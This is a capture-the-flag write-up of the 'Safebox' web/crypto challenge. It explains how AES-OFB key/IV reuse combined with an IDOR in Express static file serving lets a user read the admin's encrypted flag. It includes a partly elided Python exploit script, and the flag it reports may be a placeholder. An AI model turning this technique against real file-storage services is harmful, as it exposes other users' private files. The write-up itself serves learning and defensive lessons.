# Safebox (WEB/CRYPTO)



## Challenge Description
The challenge presented a web application called "Safebox" described as "Your files. Encrypted at rest." It allowed user registration, login, and file uploads. Files were encrypted before storage. The application reset every 15 minutes, and upon startup, a flag.txt file was uploaded to a default admin user's account. The goal was to retrieve this flag.

## Source Code Analysis
The provided source code was a Node.js application using the Express framework. Key observations:

### 1.Encryption: 
Files were encrypted using aes-256-ofb (Output Feedback mode).

```

function encrypt(buffer, key, iv) {
    const cipher = crypto.createCipheriv('aes-256-ofb', key, iv);
    let encrypted = cipher.update(buffer);
    encrypted = Buffer.concat([encrypted, cipher.final()]);
    return encrypted;
}
```
### 2.Key/IV Source: 
The encryption key and iv were derived directly from environment variables (process.env.ENCRYPTION_KEY, process.env.ENCRYPTION_IV) within the uploadFile function scope.

```
const uploadFile = async (username, fileName, buffer) => {
    const key = Buffer.from(process.env.ENCRYPTION_KEY, 'hex');
    const iv = Buffer.from(process.env.ENCRYPTION_IV, 'hex');
    // ... encryption logic ...
}
```
This implies the key and IV are static for the entire 15-minute lifetime of the server process and are the same for all users and all files encrypted during that period.

### 3.Authentication & Authorization:
Authentication was handled via a token (x-token header) checked against an in-memory users array.
An authentication middleware verified the token before granting access to subsequent routes.
File storage directories were named using sha256(username).
Static file serving for uploads was handled by express.static mounted at /files, crucially after the authentication middleware.
```

// Auth Middleware (Simplified)
app.use((req, res, next) => {
    // ... find user by token ...
    req.user = user.username; // Sets username for later potential use
    next(); // Allows access to next routes if token is valid
});

// File Serving (Placed AFTER auth middleware)
app.use("/files", express.static(path.join(__dirname, 'uploads_dir')));
```
### 4.Admin Flag: 
On startup, flag.txt is read and uploaded for the admin user using the uploadFile function, meaning it's encrypted with the static key/IV.

## Identifying Vulnerabilities
Two primary vulnerabilities were identified:

### 1.Static Key/IV Reuse in AES-OFB (Cryptographic Weakness):
 OFB is a stream cipher mode. Encryption involves XORing the plaintext (P) with a keystream (K) generated from the key and IV: C = P ⊕ K. Because the same key and IV were used for every encryption operation within a 15-minute window, the same keystream was used.

If we encrypt a known plaintext (P1) to get ciphertext C1, and the target flag plaintext (P_flag) is encrypted to get C_flag, we have:

    C1 = P1 ⊕ K
    C_flag = P_flag ⊕ K XORing these two ciphertexts cancels out the keystream:
    C1 ⊕ C_flag = (P1 ⊕ K) ⊕ (P_flag ⊕ K) = P1 ⊕ P_flag If we choose a simple known plaintext, like all null bytes (P1 = 0), then:
    C1 ⊕ C_flag = 0 ⊕ P_flag = P_flag Therefore, by uploading a file of null bytes, obtaining its ciphertext (C1), obtaining the flag's ciphertext (C_flag), and XORing them together, we can recover the flag plaintext (P_flag).
### 2.Insecure Direct Object Reference (IDOR) / Path Traversal (Web Weakness):
While the authentication middleware correctly guarded access to routes defined after it, the express.static middleware itself does not perform authorization based on the req.user property. It simply serves files based on the requested path relative to its root (uploads_dir).

Since user directories are predictably named (sha256(username)), any authenticated user could request a file from another user's directory by crafting the correct URL. For example, a logged-in user testuser could request /files/sha256('admin')/flag.txt and the server would serve it, as the initial authentication check (is the token valid?) passed.

## Exploitation Strategy
The exploit combines both vulnerabilities:

_1.Register:_  Create a new user (e.g., ctfuser) via the /api/register endpoint to obtain a valid authentication token.
_2.Upload Known Plaintext:_ Create a file consisting of null bytes (\x00) large enough to cover the expected flag length (e.g., 1-2KB). Upload this file (e.g., known.txt) to the ctfuser account via /api/upload.
_3.Calculate Hashes:_ Determine the SHA256 hashes for the registered username (ctfuser) and the target username (admin).
_4.Download Ciphertexts (using IDOR):_
Using the obtained token, download the encrypted known plaintext file from the user's directory: GET /files/sha256('ctfuser')/known.txt. Let this be C1.
Using the same token, exploit the IDOR to download the encrypted flag file from the admin's directory: GET /files/sha256('admin')/flag.txt. Let this be C_flag.
_5.Recover Flag:_ Perform a byte-wise XOR operation on the downloaded ciphertexts: Flag = C1 ⊕ C_flag.

## Exploit Script
A Python script using the requests library was used to automate this process:


```
import requests
import hashlib
import base64
import os
import time

# --- Configuration ---
TARGET_URL = "https://safebox-1bbcbadc1e5d.1753ctf.com"
USERNAME = f"ctfuser_{int(time.time()) % 10000}" # Unique username per run
PASSWORD = "password123"
KNOWN_FILENAME = "known.txt"
KNOWN_PLAINTEXT_SIZE = 2048
ADMIN_USERNAME = "admin"
FLAG_FILENAME = "flag.txt"
# --------------------

session = requests.Session()

def sha256_hex(data_bytes):
    return hashlib.sha256(data_bytes).hexdigest()

def xor_bytes(a, b):
    length = min(len(a), len(b))
    return bytes([x ^ y for x, y in zip(a[:length], b[:length])])

print(f"[+] Target URL: {TARGET_URL}")
print(f"[+] Using temporary username: {USERNAME}")

# 1. Register User
# ... (registration code) ...
# check for token

# Prepare headers for authenticated requests
auth_headers = {"x-token": token}

# 2. Prepare and Upload Known Plaintext
# ... (plaintext generation and upload code) ...
# check for success

# 3. Calculate Directory Hashes
user_hash = sha256_hex(USERNAME.encode('utf-8'))
admin_hash = sha256_hex(ADMIN_USERNAME.encode('utf-8'))
# ... (print hashes) ...

# 4. Download Encrypted Files
file_base_url = f"{TARGET_URL}/files"
enc_known_url = f"{file_base_url}/{user_hash}/{KNOWN_FILENAME}"
enc_flag_url = f"{file_base_url}/{admin_hash}/{FLAG_FILENAME}"

enc_known = None
enc_flag = None

# ... (download enc_known with error handling) ...
# ... (download enc_flag with error handling) ...

# 5. XOR Ciphertexts to Decrypt Flag
print("[+] XORing the two ciphertexts...")
# ... (check if downloads succeeded) ...
decrypted_flag_bytes = xor_bytes(enc_known, enc_flag)

# ... (print decrypted flag, handling potential decode errors) ...

```

## The Flag
Running the exploit script successfully registered a user, uploaded the null-byte file, downloaded both ciphertexts (leveraging the IDOR for the admin's file), and performed the XOR operation, revealing the flag.

Flag: 1753c{encrypt3d_but_n0t_s0000_s4fe_b0x} (Replace with actual flag if known)

<!-- Conclusion
This challenge combined a common web vulnerability (IDOR/Path Traversal) with a critical cryptographic mistake (static key/IV reuse in a stream cipher mode). It highlights the importance of:

Proper Cryptographic Implementation: Never reuse Key/IV pairs for stream ciphers like OFB or CTR. Generate unique IVs for each encryption operation. Consider stronger modes or authenticated encryption (AEAD modes like AES-GCM).
Defense in Depth & Authorization: Authentication is not enough. Authorization checks must be performed at the point of resource access to ensure a user is only accessing resources they are permitted to, even if they have a valid session/token. express.static does not perform application-level authorization. -->